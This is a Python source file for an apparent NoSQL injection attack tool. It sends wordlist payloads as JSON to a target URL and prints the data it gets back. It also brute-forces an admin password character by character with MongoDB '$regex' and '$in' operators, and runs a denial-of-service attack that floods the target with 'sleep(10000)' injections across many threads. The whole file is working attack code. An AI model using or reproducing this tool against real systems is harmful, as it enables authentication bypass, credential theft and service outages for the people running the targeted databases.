import json
import string
import concurrent.futures

import templates.HandleSignals
from templates.banner import banner , print_line
from templates.colors import *
from templates.requester import requester

class Injector:

    def __init__(self,url,data,wordlist,verbose,threads):
        self.url = url
        self.data = data
        self.wordlist = wordlist
        self.verbose = verbose
        self.threads = threads

    def start(self):

        values = {}

        with open(self.wordlist ,'r') as d:
            q = d.readlines()
            q = list(map(lambda x:x.strip(),q))

        
        for query in q:
            for x in self.data:
                #if its an object try to load from string into object
                try:
                    values[x] = json.loads(query)
                except:
                    #it fails if its a normal string not like {}
                    values[x] = query
               

            if self.verbose :
                 print(f"TRYING --> {values}")
                 print_line(blue,reset)


            payloads = json.dumps(values)
            r = requester(self.url,payloads=payloads)
            if r.status_code < 400 :
                
                print(f"SUCCESFULL INJECTION :\n {yellow} {values} {reset}")
                print(f"RESULTS:\n {red} {r.json()} {reset}")
                print_line(blue,reset)

            values.clear()

    def bruteforce_admin(self):

        password=""
        while True:
            for c in string.printable:
                if c not in ['*','+','.','?','|']:
                    payload='{"username": {"$in":["Admin", "4dm1n", "admin", "root", "administrator"]} , "password": {"$regex": "^%s" }}' % (password + c)
                    r = requester(self.url,payload)
                    if 'OK' in r.text or r.status_code == 302:
                        print("Found one more char : %s" % (password+c))
                        password += c


    def brute(self,values):
        payloads = json.dumps(values)
        r = requester(self.url,payloads=payloads)
        if r.status_code < 400 :
            print("dos")

    def dos(self):
        values = {}
        for x in self.data:
            values[x] = "';sleep(10000);'"
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:

            for _ in range(1000):
                executor.submit(self.brute , values)
            
